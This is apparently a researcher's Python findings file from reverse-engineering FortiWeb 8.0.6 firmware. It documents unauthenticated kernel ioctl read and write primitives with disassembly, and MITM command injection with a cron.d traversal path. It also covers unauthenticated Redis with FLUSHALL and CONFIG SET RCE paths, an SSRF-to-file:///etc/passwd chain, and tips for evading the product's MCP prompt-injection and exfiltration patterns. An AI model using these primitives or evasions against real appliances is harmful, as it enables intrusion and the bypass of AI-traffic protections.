"""
Fortinet FortiWeb FWB_KVM 8.0.6 RE
Source: FWB_KVM-v8.0.6.M-build0116-FORTINET.out.kvm.zip -> boot.qcow2 (296MB)
Build date: 2026-07-09 | kernel: Linux 6.1.62 (root@ad5e2f99860f)
Extraction path: QCOW2 -> boot.raw (32GB sparse) -> P1 (sector 12194) -> ext2 mount -> vmlinuz
Accessible layers: P1 boot partition (ext2), vmlinuz kernel (XZ bzImage, decompressed 46MB ELF)
Encrypted layers: rootfs.gz (custom magic 0x84fe53de), krootfs.gz (custom magic 0xb63606e9)
"""

# ---------------------------------------------------------
# Platform identity
# ---------------------------------------------------------
PLATFORM = {
    "product":        "Fortinet FortiWeb VM64-KVM",
    "os":             "FortiWeb OS 8.0.6.M",
    "build":          "0116",
    "build_date":     "2026-07-09",
    "kernel":         "Linux 6.1.62",
    "kernel_builder": "root@ad5e2f99860f",
    "arch":           "x86-64",

    "image_structure": {
        "kvm_zip":      "FWB_KVM-v8.0.6.M-build0116-FORTINET.out.kvm.zip (581MB) -> image-kvm-64/",
        "boot_qcow2":   "boot.qcow2 (296MB compressed, 32GB virtual)",
        "boot2g_qcow2": "boot_2g.qcow2 (296MB -- backup/primary swap image)",
        "log_qcow2":    "log.qcow2 (7.3MB -- separate log disk)",
        "partitions": {
            "P1": "type 0x83 Linux ext2, sector 12194, 781MB -- boot partition",
            "P2": "type 0x83 Linux ext2, 781MB -- dual-image redundancy",
            "P3": "type 0x83 Linux ext2, 195MB -- config partition",
            "P4": "type 0x83 Linux ext2, 30720MB -- data/log partition (sparse)",
        },
        "p1_files": ["vmlinuz (7.9MB bzImage)", "rootfs.gz (137MB encrypted)", "krootfs.gz (3MB encrypted)", "datafs.tar.gz (18MB)"],
        "bootline":  "DEFAULT vmlinuz ramdisk_size=870400 crashkernel=192M softlockup_panic=0 hung_task_panic=0 initrd=/rootfs.gz tpm_tis.interrupts=0 pcie_aspm=off",
    },

    "kernel_details": {
        "format":              "bzImage (boot protocol 0x020f)",
        "payload_compression": "XZ (fd 37 7a 58 5a magic)",
        "vmlinux_decompressed": "46MB ELF",
        "vmlinux_entry":       "0xffffffff80200000 (standard kernel text base)",
        "kernel_version_note": (
            "Linux 6.1.62 -- intermediate age. "
            "FGT/FAZ/FMG 8.0.0 = Linux 6.12.32 (latest). "
            "FWB 8.0.6 = Linux 6.1.62 (LTS series). "
            "FFW 8.0.0 = Linux 4.19.13 (oldest). "
            "FortiWeb uses a different kernel branch from FortiGate/FortiFirewall."
        ),
    },

    "encryption_status": {
        "rootfs_gz":   "Encrypted. Magic 0x84fe53de572ead53. FWB-specific format, NOT gzip/FAZ/FFW.",
        "krootfs_gz":  "Encrypted. Magic 0xb63606e97dfd76b9. Different format from rootfs.gz.",
        "vmlinuz":     "Accessible (XZ bzImage). vmlinux (46MB ELF) extracted.",
        "datafs_tar_gz": "Standard gzip. Not yet analyzed.",
    },
}


# ---------------------------------------------------------
# fortism ioctl dispatch -- FortiWeb 8.0.6 (Linux 6.1.62)
# ---------------------------------------------------------
FORTISM_DISPATCH = {
    "dispatch_foff":    "0x75e905",
    "dispatch_vma":     "0xffffffff8075e905",

    "dispatch_differences_from_fgt_800": {
        "mutex_pattern": (
            "NOT a simple mutex_lock/unlock pair. Uses a reference-counted gate: "
            "'mov rdi, 0x823ab1d8; call 0x80f38010' returns a value (stored in rbp). "
            "Checks and decrements [rip + 0x1c4c8a7] (semaphore count). "
            "Unlocks via 'call 0x80f37ef0' before handlers. "
            "Pattern is closer to a semaphore down/up or RCU read-lock."
        ),
        "object_table_base": "0xffffffff82caf4c0 (vs FGT 0x8188a440 -- different region)",
        "object_table_slots": "max index 0x20 (32 slots) vs FGT's 0x40 (64 slots)",
        "copy_fn":          "0xffffffff802050e0 (same signature; mov-based loop, NOT rep stosq)",
        "object_lookup_expr": "[rax * 8 - 0x7d350b40] (rax = index, -0x7d350b40 = table base)",
        "0x9005_global":    "0xffffffff823ab360 (vs FGT 0x8188a410 / FFW 0x81888410)",
        "frame_pointer":    "Omitted in dispatch; uses push rbp/r14/rbx + sub rsp,0x50 prologue",
    },

    "ioctl_map": {
        "0x9002": {
            "foff":      "0x75ea4b",
            "privilege": (
                "GATED -- different mechanism from FGT/FFW. "
                "Reads gs:[0x2b0c0] (per-CPU field), deref [+0x608], "
                "then checks [rax + rcx*16 + 0x68] == 0xffffffff823c8ba8. "
                "If pointer does not match, returns EPERM. "
                "Gated by process-specific kernel pointer match (not UID/capability check)."
            ),
            "if_gated_passes": "copy_from_user 4 bytes, call 0x80766a00(dword)",
        },
        "0x9003": {
            "foff":      "0x75eac1",
            "privilege": "ABSENT",
            "action":    "copy_from_user 0x24, object_lookup (max 0x20), read [+4/+0xc/+0x14/+0x1c], copy_to_user 0x24",
            "ref":       "FWB-F02",
        },
        "0x9004": {
            "foff":      "0x75e989",
            "privilege": "ABSENT",
            "action":    "copy_from_user 8, object_lookup (max 0x20), write dword to object[+0x44]",
            "ref":       "FWB-F01",
        },
        "0x9005": {
            "foff":      "0x75ea10",
            "privilege": "ABSENT",
            "action":    "copy_to_user(r14, 0x823ab360, 4) -- unconditional global read",
            "ref":       "FWB-F03",
        },
        "0x9007": {
            "foff":      "0x75ebcd",
            "privilege": "ABSENT",
            "partial_mitigation": "js check on signed size prevents overflow copy (see FWB-F04)",
            "ref":       "FWB-F04",
        },
        "0x9009": {
            "foff":      "0x75eb63",
            "privilege": "ABSENT",
            "action":    "object_lookup, if object[+0x30]==3 return global at 0x823ab360; else return object[+0x30]",
            "ref":       "FWB-F03",
        },
    },
}


# ---------------------------------------------------------
# FWB-F01: ioctl 0x9004 unauth write to kernel object[+0x44]
#          Cross-product: FGT-F19, FFW-F01
# ---------------------------------------------------------
FWB_F01_IOCTL_0x9004_UNAUTH_WRITE = {
    "id":       "FWB-F01",
    "product":  "Fortinet FortiWeb OS 8.0.6 (fortism kernel module, Linux 6.1.62)",
    "severity": "HIGH -- unauth write to kernel object field; no privilege gate",
    "class":    "Unprivileged write to kernel object field via fortism ioctl 0x9004",
    "cwe":      "CWE-284 (Improper Access Control)",
    "cross_product": "FGT-F19 / FFW-F01 -- same pattern; FortiWeb-specific table address",

    "foff_handler": "0x75e989",

    "attack_flow": """\
; User-supplied: { uint32_t index; int32_t value; }  (8 bytes)
; Call: ioctl(any_fd, 0x9004, &user_struct)
;
; ioctl 0x9004 path (no privilege check):
; user ptr range check (0x7fffffffeffc limit -- FWB user-space check)
copy_from_user(rsp, r14, 8)                 ; read {index, value}
mov eax, dword ptr [rsp]                    ; index (NOT sign-extended yet)
cmp rax, 0x20                               ; BOUNDS CHECK: 0x20 (32), NOT 0x40 as in FGT!
ja  -> EINVAL
mov rax, qword ptr [rax*8 - 0x7d350b40]    ; object_lookup: table at 0x82caf4c0
test rax, rax
je  -> EFAULT
mov ebp, dword ptr [rsp + 4]               ; value (second 4 bytes)
mov dword ptr [rax + 0x44], ebp            ; WRITE to object[+0x44]
jmp -> return 0
""",

    "disasm_evidence": [
        "0xffffffff8075e9c5  cmp rax, 0x20               ; bounds check",
        "0xffffffff8075e9cf  mov rax, [rax*8 - 0x7d350b40]  ; object_lookup",
        "0xffffffff8075e9e0  mov ebp, dword ptr [rsp + 4] ; value",
        "0xffffffff8075e9e4  mov dword ptr [rax + 0x44], ebp  ; WRITE",
        "0xffffffff8075e9e7  jmp 0xffffffff8075ec89       ; return 0",
    ],

    "vs_fgt_ffw": {
        "same_field": "object[+0x44] write -- identical offset",
        "diff_bounds": "FWB: index <= 0x20 (32 slots) vs FGT/FFW: index <= 0x40 (64 slots)",
        "diff_table":  "FWB: 0x82caf4c0 vs FGT: 0x8188a440 vs FFW: ~0x8188a440",
    },

    "status": "CONFIRMED attack primitive -- unauth write to kernel object field at +0x44.",
}


# ---------------------------------------------------------
# FWB-F02: ioctl 0x9003 unauth kernel object multi-field read
#          Cross-product: FGT-F20, FFW-F02
# ---------------------------------------------------------
FWB_F02_IOCTL_0x9003_UNAUTH_READ = {
    "id":       "FWB-F02",
    "product":  "Fortinet FortiWeb OS 8.0.6 (fortism kernel module, Linux 6.1.62)",
    "severity": "MEDIUM -- 28 bytes of kernel object internals readable by any local process",
    "class":    "Unprivileged read of kernel object fields via fortism ioctl 0x9003",
    "cwe":      "CWE-200 (Information Exposure Through Returned Data)",
    "cross_product": "FGT-F20 / FFW-F02 -- identical field reads; FortiWeb-specific table",

    "foff_handler": "0x75eac1",

    "attack_flow": """\
; User-supplied: { uint32_t index; uint8_t pad[32]; }  (36 bytes)
; Call: ioctl(any_fd, 0x9003, &user_struct) -> fills pad with 28 bytes of object data
;
; ioctl 0x9003 path (no privilege check):
copy_from_user(rsp, r14, 0x24)             ; read 36 bytes
mov eax, dword ptr [rsp]                   ; index
cmp rax, 0x20                              ; bounds: 32 slots in FWB
ja  -> EINVAL
mov rax, [rax*8 - 0x7d350b40]             ; object_lookup
test rax, rax
je  -> EFAULT
stack[8:16]  = object[4:12]               ; QWORD at +0x04
stack[16:24] = object[12:20]              ; QWORD at +0x0c
stack[24:32] = object[20:28]              ; QWORD at +0x14
stack[32:36] = object[28:32]              ; DWORD at +0x1c
copy_to_user(r14, rsp, 0x24)             ; return 36 bytes
return 0
""",

    "disasm_evidence": [
        "0xffffffff8075eaf6  mov eax, dword ptr [rsp]",
        "0xffffffff8075eb00  cmp rax, 0x20",
        "0xffffffff8075eb0a  mov rax, qword ptr [rax*8 - 0x7d350b40]",
        "0xffffffff8075eb1b  mov ecx, dword ptr [rax + 0x1c]  ; DWORD",
        "0xffffffff8075eb22  mov rcx, qword ptr [rax + 0x14]  ; QWORD",
        "0xffffffff8075eb2b  mov rcx, qword ptr [rax + 4]     ; QWORD",
        "0xffffffff8075eb2f  mov rax, qword ptr [rax + 0xc]   ; QWORD",
    ],

    "kaslr_potential": (
        "Same as FGT-F20: if any leaked QWORD is a kernel pointer, enables KASLR bypass. "
        "Cannot confirm without live system (objects NULL in static binary)."
    ),

    "status": "CONFIRMED attack primitive -- 28 bytes of kernel object internal state disclosed.",
}


# ---------------------------------------------------------
# FWB-F03: ioctl 0x9005/0x9009 unauth kernel global read
#          Cross-product: FGT-F21, FFW-F03
# ---------------------------------------------------------
FWB_F03_IOCTL_UNAUTH_GLOBAL_READ = {
    "id":       "FWB-F03",
    "product":  "Fortinet FortiWeb OS 8.0.6 (fortism kernel module, Linux 6.1.62)",
    "severity": "LOW-MEDIUM -- 4-byte global read; KASLR bypass potential if pointer",
    "class":    "Unauth kernel global read via ioctl 0x9005 (and 0x9009 conditionally)",
    "cwe":      "CWE-200",
    "cross_product": "FGT-F21 / FFW-F03 -- same pattern; FWB-specific global VMA",

    "0x9005": {
        "foff_handler": "0x75ea10",
        "global_vma":   "0xffffffff823ab360",
        "disasm": [
            "0xffffffff8075ea32  mov rsi, 0xffffffff823ab360  ; kernel global src",
            "0xffffffff8075ea39  call 0x802050e0              ; copy_to_user(user, global, 4)",
        ],
        "privilege": "ABSENT",
        "vs_fgt": "FGT global: 0x8188a410 / FFW: 0x81888410 / FWB: 0x823ab360 -- all different",
    },

    "0x9009": {
        "foff_handler": "0x75eb63",
        "behavior":     "Same dual-behavior as FGT/FFW: object[+0x30]==3 returns global; else returns object[+0x30]",
        "global_vma":   "0xffffffff823ab360 (same as 0x9005)",
    },

    "runtime_global_significance": (
        "0x823ab360 is in FortiWeb's BSS/data section. "
        "Zero in static vmlinux. Populated by Fortinet daemons at runtime. "
        "If contains a kernel pointer: KASLR bypass for any local process."
    ),
}


# ---------------------------------------------------------
# FWB-F04: ioctl 0x9007 integer overflow -- PARTIAL MITIGATION
#          Cross-product: FGT-F22/FGT-F16 (BEHAVIOR DIFFERS SIGNIFICANTLY)
# ---------------------------------------------------------
FWB_F04_IOCTL_0x9007_OVERFLOW = {
    "id":       "FWB-F04",
    "product":  "Fortinet FortiWeb OS 8.0.6 (fortism kernel module, Linux 6.1.62)",
    "severity": "LOW -- integer overflow EXISTS but MITIGATED by signed size check; heap overflow NOT possible",
    "class":    "Integer overflow in fortism ioctl 0x9007 -- partially mitigated",
    "cross_product": "FGT-F16 / FGT-F22 / FFW-F04 -- SAME overflow; DIFFERENT mitigation",

    "foff_handler": "0x75ebcd",

    "overflow_path": {
        "trigger":        "size = 0xffffffff (second dword of 16-byte input)",
        "overflow":       "`inc eax` with eax=0xffffffff -> eax=0 (32-bit wrap)",
        "kmalloc":        "kmalloc(0) -- valid SLUB allocation (~64 bytes)",
        "mitigation":     "`movsxd r14, dword ptr [rsp+4]` re-reads size: r14 = 0xffffffff sign-extended = -1",
        "signed_check":   "`test r14, r14; js 0x8075ed79` -- SF=1 (r14 is negative), branch TAKEN",
        "result":         "Returns to error path WITHOUT calling copy_from_user. No heap overflow. kmalloc(0) allocated but freed.",
    },

    "vs_fgt_ffw": {
        "fgt_800": "No js check. copy_from_user(heap, user, 0xffffffff) -> rep stosq crash (FGT-F16 DoS CONFIRMED).",
        "ffw_800": "No js check. Standard mov-loop copy -> heap overflow POSSIBLE if user has mapped pages.",
        "fwb_806": "js check PRESENT. copy_from_user with 0xffffffff size BLOCKED. DoS NOT possible via this path.",
    },

    "partial_fix_analysis": (
        "FWB 8.0.6 appears to have independently mitigated the integer overflow in 0x9007 "
        "by adding a signed size check after the sign-extension. FGT and FFW lack this check. "
        "The kmalloc(0) allocation still occurs (minor resource leak) but the dangerous copy is blocked. "
        "This suggests Fortinet was aware of an issue in this path for FortiWeb specifically, "
        "or the fix was introduced in the newer kernel base (6.1.62 vs 6.12.32 for FGT / 4.19.13 for FFW). "
        "The mitigation is NOT present in FGT-F16 or FFW-F04."
    ),

    "oracle_still_active": {
        "description": "For valid sizes (>= 0, < 0x80000000): same boolean string query oracle as FGT-F22.",
        "ref":         "FGT-F22 in fortinet_fortigate_re.py for oracle semantics detail.",
    },

    "copy_from_user_behavior": {
        "function": "0xffffffff802050e0",
        "type":     "Standard aligned 64-byte chunk mov-loop (same as FFW/FGT); NOT rep stosq",
        "note":     "FWB-F04 DoS would NOT apply even without the js mitigation (no rep stosq)",
    },
}


# ---------------------------------------------------------
# Cross-product vulnerability map
# ---------------------------------------------------------
CROSS_PRODUCT_MAP = {
    "FGT-F19 (FGT 8.0.0)": "FWB-F01 -- same 0x9004 write to object[+0x44], different table (0x82caf4c0 vs 0x8188a440), smaller table (32 vs 64 slots)",
    "FGT-F20 (FGT 8.0.0)": "FWB-F02 -- same 0x9003 field read pattern; same field offsets (+4/+0xc/+0x14/+0x1c)",
    "FGT-F21 (FGT 8.0.0)": "FWB-F03 -- same 0x9005 global read; different global VMA (0x823ab360)",
    "FGT-F22 (FGT 8.0.0)": "FWB-F04 -- same integer overflow in 0x9007; but FWB has js MITIGATION",
    "FGT-F16 (FGT 8.0.0)": "NOT applicable in FWB -- js check + no rep stosq",
    "FFW-F01 (FFW 8.0.0)": "FWB-F01 -- equivalent",
    "FFW-F02 (FFW 8.0.0)": "FWB-F02 -- equivalent",
    "FFW-F03 (FFW 8.0.0)": "FWB-F03 -- equivalent",
    "FFW-F04 (FFW 8.0.0)": "FWB-F04 -- same overflow, different mitigation status",
    "FFW-F05 (FFW 8.0.0)": "cross-product fgt2.key shared RSA private key; same modulus A75C115F... as FGT 7.4.12 (FGT-F27) + FGT 8.0.0 + FGA 8.0.0",
}


# ---------------------------------------------------------
# FWB-F05: wassd_ws.py TLS verification disabled -- Fortinet cloud mgmt channel MitM
# ---------------------------------------------------------
FWB_F05_WASSD_TLS_MITM = {
    "id":       "FWB-F05",
    "product":  "Fortinet FortiWeb 8.0.0",
    "severity": "HIGH -- wassd_ws.py (Fortinet cloud management WebSocket client) sets ctx.verify_mode = ssl.CERT_NONE; MitM on the cloud management channel allows injecting cert updates, filebeat log forwarding targets, and ABP config",
    "class":    "Improper certificate validation (CWE-295)",

    "description": (
        "FortiWeb ships wassd_ws.py (/data/etc/wassd_ws.py), a Python WebSocket client that "
        "connects to Fortinet's cloud infrastructure to receive management commands. "
        "The TLS context is explicitly configured to skip certificate verification: "
        "'ctx = ssl.create_default_context()' followed immediately by 'ctx.verify_mode = ssl.CERT_NONE'. "
        "This allows any party who can intercept the WebSocket connection (DNS poisoning, ARP spoofing, "
        "or BGP hijack of Fortinet's cloud IPs) to impersonate the Fortinet cloud server and inject "
        "management commands into FortiWeb. "
        "The commands that can be injected include: "
        "(1) update_msk_certificate: overwrite /etc/filebeat/client_cert.pem and /etc/filebeat/private-key.pem with attacker-controlled cert/key; "
        "(2) start_on_premise_alog: start filebeat log forwarding with attacker-controlled MSK_domain (Kafka endpoint) and MSK_topic -- FortiWeb audit logs forwarded to attacker; "
        "(3) update_abp: write arbitrary file names to /tmp/abp_id/ directory."
    ),

    "code_evidence": {
        "file":         "/data/etc/wassd_ws.py",
        "line_204_207": "ctx = ssl.create_default_context() ... ctx.verify_mode = ssl.CERT_NONE",
        "line_209":     "self.connection = await websockets.connect(uri=self.ws_url, extra_headers=header, ssl=ctx)",
        "line_341_356": "json_msg = json.loads(message); dispatches to start_handler/stop_handler/updatecert_handler/update_abp_handler",
    },

    "injected_command_impacts": {
        "update_msk_certificate": {
            "handler":  "updatecert_handler(json_msg)",
            "writes":   "json_msg['cert'] -> /etc/filebeat/client_cert.pem; json_msg['key'] -> /etc/filebeat/private-key.pem",
            "impact":   "Replaces FortiWeb's MSK client cert with attacker's; allows attacker to authenticate to Fortinet's MSK Kafka as FortiWeb",
        },
        "start_on_premise_alog": {
            "handler":  "start_handler(json_msg)",
            "writes":   "json_msg['MSK_domain'] and json_msg['MSK_topic'] -> /etc/filebeat/filebeat.yml",
            "impact":   "FortiWeb audit logs (WAF events, attack logs, client IPs, request bodies) forwarded to attacker-controlled Kafka endpoint",
            "secondary": "MSK_domain string written directly into YAML with no sanitization; newlines in json_msg['MSK_domain'] inject arbitrary YAML into filebeat config",
        },
        "update_abp": {
            "handler":  "update_abp_handler(json_msg)",
            "writes":   "json_msg['appid'] items -> /tmp/abp_id/<appid>",
            "impact":   "Write arbitrary file names to /tmp/abp_id/; directory traversal in appid value creates files outside /tmp/abp_id if appid='../../../etc/cron.d/backdoor'",
        },
    },

    "remediation": (
        "Remove 'ctx.verify_mode = ssl.CERT_NONE'. "
        "Load a pinned Fortinet CA certificate into the SSL context via 'ctx.load_verify_locations(ca_bundle)'. "
        "Set 'ctx.check_hostname = True'. "
        "Sanitize MSK_domain and MSK_topic values from WebSocket messages before writing to filebeat config."
    ),
}


# ---------------------------------------------------------
# FWB-F06: 10 Redis instances without requirepass on loopback
# ---------------------------------------------------------
FWB_F06_REDIS_NO_AUTH = {
    "id":       "FWB-F06",
    "product":  "Fortinet FortiWeb 8.0.0",
    "severity": "MEDIUM -- 10 Redis instances (ports 6379-6389, 6382) bind to 127.0.0.1 with no requirepass; unauthenticated access from any process on the FortiWeb host or via SSRF; WAF session data, rate limiting state, and WAF rule cache exposed",
    "class":    "Missing authentication for critical function (CWE-306)",

    "description": (
        "FortiWeb ships Redis configuration files for 10 separate instances: "
        "ports 6379, 6380, 6381, 6382 (redis-cache / redis-cache-cloud), 6383, 6384, 6385, 6386, 6387, 6388, 6389. "
        "All config files: bind 127.0.0.1 (loopback only) AND no requirepass directive (commented out as '# requirepass foobared'). "
        "Redis without requirepass accepts any connection from 127.0.0.1 without authentication. "
        "For a WAF product, Redis is the backbone for: session token storage, rate limiting counters, "
        "WAF rule cache, bot detection state (FortiWeb ABP), ML model inference cache. "
        "Any SSRF vulnerability in FortiWeb's web application, or any local process (compromised via "
        "another vulnerability), can issue arbitrary Redis commands to all 10 instances: "
        "KEYS *, GET <session_token>, FLUSHALL (destroy all WAF state), SET (forge session tokens), "
        "CONFIG SET dir/dbfilename (write files to disk, potential RCE via Redis config write)."
    ),

    "evidence": {
        "redis_configs":  "10 files in /data/etc/redis/: redis.conf (6379), redis_6380-6389.conf, redis-cache.conf (6382), redis-cache-cloud.conf (6382)",
        "no_requirepass": "All files: requirepass commented out or absent; only '# requirepass foobared' example line",
        "bind_loopback":  "All instances: bind 127.0.0.1 (access restricted to same host)",
    },

    "redis_config_map": {
        "6379": "redis.conf -- primary Redis instance",
        "6380": "redis_6380.conf",
        "6381": "redis_6381.conf",
        "6382": "redis-cache.conf / redis-cache-cloud.conf -- cache instance",
        "6383": "redis_6383.conf",
        "6384": "redis_6384.conf",
        "6385": "redis_6385.conf",
        "6386": "redis_6386.conf",
        "6387": "redis_6387.conf",
        "6388": "redis_6388.conf",
        "6389": "redis_6389.conf",
    },

    "ssrf_amplification": (
        "FortiWeb is a WAF that handles HTTP traffic from external clients. "
        "Any SSRF in FortiWeb's management interface (e.g., server URL fields, webhook configs) "
        "targeting 127.0.0.1:6379-6389 gives full unauthenticated Redis access. "
        "FLUSHALL destroys all WAF protection state. "
        "CONFIG SET enables Redis filesystem write (RCE path if Redis runs as root or in a writable directory)."
    ),

    "remediation": (
        "Set unique strong passwords for each Redis instance via requirepass in each config file. "
        "Consider Redis 6+ ACL system for granular per-command authentication. "
        "If Redis instances do not need to talk to each other, remove all cross-instance replication config. "
        "Monitor Redis command logs for FLUSHALL, CONFIG SET, DEBUG commands."
    ),
}


# ---------------------------------------------------------
# FWB-F07: Shibboleth SP 2.x in FortiWeb SAML implementation (EOL)
# ---------------------------------------------------------
FWB_F07_SHIBBOLETH_EOL = {
    "id":       "FWB-F07",
    "product":  "Fortinet FortiWeb 8.0.0",
    "severity": "MEDIUM -- Shibboleth SP 2.x (EOL 2022) used for SAML SSO; same EOL library pattern as FAD-F10 in FortiADC",
    "class":    "EOL dependency (CWE-1329) / same class as FAD-F10",

    "description": (
        "FortiWeb 8.0.0 ships Shibboleth SP configuration files at /data/etc/saml/shibboleth/ "
        "(attribute-map.xml, attribute-policy.xml, protocols.xml, native.logger, keygen.sh, etc.). "
        "The attribute-map.xml uses 'xmlns:urn:mace:shibboleth:2.0:attribute-map' namespace, "
        "confirming Shibboleth SP 2.x. "
        "Shibboleth SP 2.x reached end-of-life in 2022; shipped in FortiWeb 8.0.0 firmware (2026). "
        "Same class of finding as FAD-F10 (FortiADC). Affects all FortiWeb deployments using SAML SSO."
    ),

    "evidence": {
        "config_dir":        "/data/etc/saml/shibboleth/ (attribute-map.xml, attribute-policy.xml, protocols.xml, ...)",
        "namespace":         "xmlns='urn:mace:shibboleth:2.0:attribute-map' -- Shibboleth SP 2.x namespace",
        "eol_date":          "Shibboleth SP 2.x EOL 2022; FortiWeb 8.0.0 built 2026-07-09",
        "cross_product":     "FAD-F10 (FortiADC 8.0.4): libshibsp-lite.so.6 + shibboleth 2.5.6 confirmed via binary strings",
    },

    "cve_candidates": {
        "CVE-2017-16853": "Shibboleth SP 2.x < 2.6.1 -- session ID replay (same as FAD-F10)",
    },

    "remediation": "Upgrade to Shibboleth SP 3.x (supported) or migrate to a supported SAML implementation.",
}


# ---------------------------------------------------------
# FWB-F08: FortiWeb MCP WAF -- security pattern DB analysis
# ---------------------------------------------------------
FWB_F08_MCP_WAF_PATTERNS = {
    "id":       "FWB-F08",
    "product":  "Fortinet FortiWeb 8.0.0",
    "severity": "INFO -- FortiWeb ships an MCP traffic WAF with 23 attack pattern categories; the GenericAPIKey pattern (20-50 alphanumeric chars) is over-broad and will cause false positives on standard auth tokens, JWTs, and UUIDs",
    "class":    "Security product architecture disclosure + WAF pattern analysis (CWE-693 Protection Mechanism Failure via over-broad patterns)",

    "description": (
        "FortiWeb ships /data/etc/mcp_security_db.json (version 1.00010, updated 2025-09-15), "
        "a WAF pattern database for inspecting MCP (Model Context Protocol) traffic. "
        "FortiWeb acts as an MCP-aware WAF proxy -- it monitors tools/call requests, tools/list "
        "responses, and prompts/get responses across 4 MCP protocol versions "
        "(2024-11-05, 2025-03-26, 2025-06-18, 2025-11-25). "
        "The secretsDetection.GenericAPIKey pattern '[A-Za-z0-9]{20,50}' matches any 20-50 char "
        "alphanumeric string -- this will match JWTs, UUIDs, session tokens, and legitimate API keys, "
        "causing legitimate MCP tool calls to be blocked. Any MCP pattern that triggers "
        "a false positive reveals a bypass: encode arguments to exceed the pattern width, use "
        "Unicode normalization, or inject whitespace to break the regex match."
    ),

    "mcp_methods_monitored": {
        "tools/call request": ["/params/arguments (keys scan)", "/params/arguments (values scan -- 8 pattern groups)"],
        "prompts/get request": ["/params/name (values scan)"],
        "tools/list response": ["/result/tools/description (16 pattern groups)"],
        "prompts/get response": ["/result/messages/content/text (17 pattern groups)"],
    },

    "pattern_groups": [
        "hiddenInstructions", "dataExfiltration", "secretsDetection", "maliciousContent",
        "sensitiveFileAccess", "codeInjection", "dataAnonymization", "steganography",
        "promptInjection", "maliciousCodeExecution", "sqlInjection", "toxicLanguage",
        "dataHarvesting", "testPatterns", "competitorBlocking", "refusalDetection",
        "biasDetection", "jsonValidation", "languageFiltering", "mcpSpecificAttacks",
        "resourceExhaustion", "modelManipulation", "attackTargetKeywords",
    ],

    "over_broad_patterns": {
        "GenericAPIKey": "[A-Za-z0-9]{20,50} -- matches JWTs, UUIDs, session tokens, auth headers, model names",
        "IPAddress":     "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3} -- matches any IPv4 including localhost, internal IPs in scan results",
        "URL":           "Broad URL regex including HTTP(S) -- will match most tool responses that reference endpoints",
        "BankAccount":   "[0-9]{8,12} -- matches any 8-12 digit number (phone numbers, ZIP codes, timestamps)",
    },

    "mcpSpecificAttacks_bypass": {
        "ToolEnumeration":     "Pattern targets 'list tools' phrase; bypassed by using synonyms: 'show capabilities', 'what can you do'",
        "ProtocolVersionBypass": "Pattern targets 'version override' phrase; bypass via indirect reference",
    },

    "mcp_versions_supported": ["2024-11-05", "2025-03-26", "2025-06-18", "2025-11-25"],

    "attack_surface": (
        "FortiWeb's MCP WAF is positioned as an inline proxy between AI clients and MCP servers. "
        "If an attacker can enumerate the over-broad patterns and find inputs that trigger false "
        "positives (e.g., legitimate tool calls blocked), they can extract partial WAF rule knowledge. "
        "More critically: if the WAF pattern blocks legitimate MCP tool responses (due to GenericAPIKey "
        "matching auth tokens in tool output), the WAF effectively becomes a denial-of-service for "
        "AI-integrated workflows -- a WAF misconfiguration that breaks legitimate AI tool calls."
    ),
}


# ---------------------------------------------------------
# FWB-F09: FortiWeb WVS (w3af REST API) -- permissive-auth-by-default
# ---------------------------------------------------------
FWB_F09_WVS_NO_AUTH = {
    "id":       "FWB-F09",
    "product":  "Fortinet FortiWeb 8.0.0 (wvs.tar.xz -- embedded w3af 1.x REST API)",
    "severity": "CANDIDATE -- w3af REST API at 127.0.0.1:5000 bypasses all auth if PASSWORD not configured at startup; if FortiWeb launches WVS without a password, any process with loopback access can submit arbitrary scan targets including file:// URLs (local file read) and internal services (SSRF)",
    "class":    "Authentication bypass via missing configuration (CWE-287) + SSRF via scan target injection",

    "description": (
        "FortiWeb ships wvs.tar.xz on its p1 partition (59MB). "
        "The package contains a complete w3af REST API server. "
        "The auth decorator (w3af/core/ui/api/utils/auth.py:requires_auth) has a permissive default: "
        "if 'PASSWORD' is NOT in app.config, the decorator immediately calls the wrapped function "
        "without any credential check. "
        "The API default bind is 127.0.0.1:5000 with no default password. "
        "The scan endpoint (POST /scans/) accepts arbitrary target_urls. "
        "w3af explicitly warns: 'arbitrary file reads through file:// protocol specifications in "
        "target URLs' are possible without auth. "
        "If FortiWeb launches WVS without the -p (password) flag or a YAML config with PASSWORD, "
        "any process or SSRF chain that reaches 127.0.0.1:5000 can initiate arbitrary scans."
    ),

    "code_evidence": {
        "auth_bypass_path":  "wvs/.wvs-engine/w3af/core/ui/api/utils/auth.py lines 40-43",
        "bypass_condition":  "if not 'PASSWORD' in app.config: return f(*args, **kwargs)  # no auth",
        "default_config":    "DEFAULTS = {'USERNAME': 'admin', 'HOST': '127.0.0.1', 'PORT': 5000, 'DISABLE_SSL': False}  # no PASSWORD default",
        "scan_endpoint":     "POST /scans/ -- @requires_auth -- accepts {scan_profile, target_urls: []}",
        "upstream_warning":  "w3af cli.py: 'Running this API on a public IP might expose your system to vulnerabilities such as arbitrary file reads through file:// protocol specifications in target URLs'",
    },

    "attack_chain": (
        "FortiWeb admin SSRF (any URL field -> 127.0.0.1:5000) -> "
        "POST /scans/ with target_urls=['file:///etc/passwd'] -> "
        "w3af reads file:// target, results at GET /scans/<id>/kb/ -> "
        "local file disclosure from FortiWeb filesystem"
    ),

    "source_code_evidence": {
        "file":     "wvs/.wvs-engine/w3af/core/ui/api/utils/auth.py lines 39-45",
        "bypass":   "if not 'PASSWORD' in app.config: return f(*args, **kwargs)  # bypass -- no auth check",
        "cli_flag": "'-p' password flag: required=False, default=False (cli.py process_cmd_args_config)",
        "scans":    "POST /scans/ target_urls field accepts any URL; URL() constructor allows file://, http://, ftp://",
    },
    "status": "CONFIRMED -- source code in wvs.tar.xz confirms auth bypass when PASSWORD not in app.config; "
              "password flag optional; file:// protocol accepted in scan targets",
    "blocker": "Cannot confirm at static analysis whether FortiWeb sets a WVS password at startup (startup scripts in encrypted rootfs); runtime confirmation still required to assert exploitability",

    "remediation": "FortiWeb should always pass a randomly-generated SHA512 password hash to w3af_api at startup; bind w3af_api to a Unix domain socket instead of TCP loopback if feasible; restrict /scans/ to http(s) scheme targets only.",
}


# ---------------------------------------------------------
# FWB-F10: Python dependency stack -- outdated packages with known CVEs
# ---------------------------------------------------------
FWB_F10_PYTHON_DEPS_CVES = {
    "id":       "FWB-F10",
    "product":  "Fortinet FortiWeb 8.0.6 (python-libs.tar.xz -- Python 3.10 + site-packages backing WVS and management stack)",
    "severity": "LOW -- outdated package versions with known CVEs; exploitability requires reaching specific Python services (w3af REST API, Django management interface); not directly reachable without prior auth or SSRF",
    "class":    "Vulnerable Component (CWE-1395) / Outdated Third-Party Library (CWE-477)",

    "description": (
